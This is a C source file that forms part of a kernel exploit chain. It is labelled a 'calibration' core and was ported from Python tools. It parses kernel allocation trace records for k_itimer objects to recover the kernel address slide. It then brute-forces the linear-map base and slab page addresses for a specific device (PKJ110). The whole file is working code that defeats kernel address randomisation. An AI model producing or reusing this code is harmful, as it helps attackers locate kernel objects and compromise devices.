/*
 * calib_core.c - pure-compute part of the calibration algorithm (no platform deps, host unit-testable)
 *
 * Corresponds to the python in the PC reference implementation:
 *   calib_scan_kitimer / calib_top_values  <- tools/slide_from_timers.py scans()
 *   calib_solve_lmap                        <- tools/solve_lmap.py solve loop
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "calib.h"

/* Scan range of solve_lmap.py: PKJ110 DRAM starts at 0x80000000,
 * linear map base = PAGE_OFFSET - 0x80000000, must not start scanning from 0xFFFFFF8000000000 */
#ifndef SCAN_START
#define SCAN_START UINT64_C(0xFFFFFF7E00000000)
#endif
#ifndef LMAP_END
#define LMAP_END   UINT64_C(0xFFFFFF8C00000000)
#endif
#ifndef SCAN_STEP
#define SCAN_STEP  UINT64_C(0x200000)
#endif

static uint64_t rd_u64(const uint8_t *p)
{
	uint64_t v = 0;
	memcpy(&v, p, 8);
	return v;
}

static int cmp_u64(const void *a, const void *b)
{
	uint64_t x = *(const uint64_t *)a;
	uint64_t y = *(const uint64_t *)b;
	return (x > y) - (x < y);
}

static int cmp_run(const void *a, const void *b)
{
	const struct calib_run *x = a;
	const struct calib_run *y = b;
	if (x->count != y->count)
		return (int)((int64_t)y->count - (int64_t)x->count);
	return (x->value > y->value) - (x->value < y->value);
}

/*
 * Scan raw trace for kmem_cache_alloc records (layout matches slide_from_timers.py):
 *   [k-16] = call site
 *   [k-8]  = allocated object virtual address ptr
 *   [k]    = bytes_req
 *   [k+8]  = bytes_alloc
 * A record matches when req == alloc == sizes[si] for some candidate si (the original
 * req==alloc invariant is preserved, only widened from a single hardcoded size to the union
 * of candidate sizes passed in). ptr must start with 0xFFFF and be 8-byte aligned;
 * site must start with 0xFFFF. When filter_site=1, additionally require site == site_link
 * (calib_b filters with the already-solved slide, matching solve_lmap.py).
 *
 * sizes/n_sizes: candidate set of sizeof(struct k_itimer). If NULL or empty, a built-in
 * default set {0x108,0x100,0x110,0x118} is used so host unit tests stay runnable.
 * want_site=1 collects call sites, otherwise object virtual addresses. Returns a malloc'd array.
 */
uint64_t *calib_scan_kitimer(const uint8_t *d, size_t n, uint64_t site_link,
			     int want_site, int filter_site,
			     const uint64_t *sizes, size_t n_sizes, size_t *out_n)
{
	size_t cap = 4096, cnt = 0;
	uint64_t *out = malloc(cap * sizeof(*out));
	size_t k;

	*out_n = 0;
	if (!out)
		return NULL;

	/* default candidate k_itimer sizes (non-empty, host unit-testable) */
	static const uint64_t DEFAULT_SIZES[] = {0x108, 0x100, 0x110, 0x118};
	if (!sizes || n_sizes == 0) {
		sizes = DEFAULT_SIZES;
		n_sizes = sizeof(DEFAULT_SIZES) / sizeof(DEFAULT_SIZES[0]);
	}

	for (k = 24; k + 16 < n; k++) {
		uint64_t req, alloc, ptr, site;
		size_t si;
		int match = 0;
		req = rd_u64(d + k);
		alloc = rd_u64(d + k + 8);
		/* match any candidate k_itimer size (req==alloc invariant kept) */
		for (si = 0; si < n_sizes; si++) {
			if (req == sizes[si] && alloc == sizes[si]) {
				match = 1;
				break;
			}
		}
		if (!match)
			continue;
		ptr = rd_u64(d + k - 8);
		if ((ptr >> 48) != 0xFFFF || (ptr & 7))
			continue;
		site = rd_u64(d + k - 16);
		if ((site >> 48) != 0xFFFF)
			continue;
		if (filter_site && site != site_link)
			continue;
		if (cnt == cap) {
			uint64_t *p = realloc(out, (cap * 2) * sizeof(*out));
			if (!p)
				break;
			cap *= 2;
			out = p;
		}
		out[cnt++] = want_site ? site : ptr;
	}
	*out_n = cnt;
	return out;
}

/* count the most frequent values (descending), return the number written */
size_t calib_top_values(uint64_t *arr, size_t n, struct calib_run *out,
			size_t out_cap)
{
	size_t i, m = 0;
	if (!n || !arr)
		return 0;
	qsort(arr, n, sizeof(*arr), cmp_u64);
	for (i = 0; i < n;) {
		size_t j = i + 1;
		while (j < n && arr[j] == arr[i])
			j++;
		if (m < out_cap) {
			out[m].value = arr[i];
			out[m].count = (int)(j - i);
			m++;
		}
		i = j;
	}
	qsort(out, m, sizeof(*out), cmp_run);
	return m;
}

/* binary search over a sorted PFN set (replaces Python's set lookup) */
static int pfn_in(const uint64_t *set, size_t n, uint64_t v)
{
	size_t lo = 0, hi = n;
	while (lo < hi) {
		size_t mid = (lo + hi) / 2;
		if (set[mid] == v)
			return 1;
		if (set[mid] < v)
			lo = mid + 1;
		else
			hi = mid;
	}
	return 0;
}

/*
 * Scan candidate linear map bases L (2MiB steps); the correct L makes every slab page
 * derived PFN land in the order-1 allocation set. Returns the L with the most hits.
 */
uint64_t calib_solve_lmap(const uint64_t *pages, size_t n_pages,
			  const uint64_t *pfns, size_t n_pfns,
			  uint64_t *best_score)
{
	uint64_t L;
	uint64_t best_base = 0;
	uint64_t best = 0;

	*best_score = 0;
	if (!n_pages || !n_pfns)
		return 0;
	for (L = SCAN_START; L < LMAP_END; L += SCAN_STEP) {
		uint64_t score = 0;
		size_t p;
		int bad = 0;
		for (p = 0; p < n_pages; p++) {
			if (pages[p] < L) {
				bad = 1;
				break;
			}
			if (pfn_in(pfns, n_pfns, (pages[p] - L) >> 12))
				score++;
		}
		if (bad)
			continue;
		if (score > best) {
			best = score;
			best_base = L;
		}
	}
	*best_score = best;
	return best_base;
}

/* convert object virtual addresses into deduplicated slab pages (order-1 = 8KB, so 8K aligned) */
size_t calib_pages_from_ptrs(uint64_t *ptrs, size_t n_ptrs, uint64_t *pages)
{
	size_t n = 0, i, j;
	if (!n_ptrs)
		return 0;
	qsort(ptrs, n_ptrs, sizeof(*ptrs), cmp_u64);
	for (i = 0; i < n_ptrs;) {
		size_t k = i + 1;
		while (k < n_ptrs && ptrs[k] == ptrs[i])
			k++;
		pages[n++] = ptrs[i] & ~UINT64_C(0x1fff);
		i = k;
	}
	qsort(pages, n, sizeof(*pages), cmp_u64);
	j = 0;
	for (i = 0; i < n; i++) {
		if (j == 0 || pages[j - 1] != pages[i])
			pages[j++] = pages[i];
	}
	return j;
}
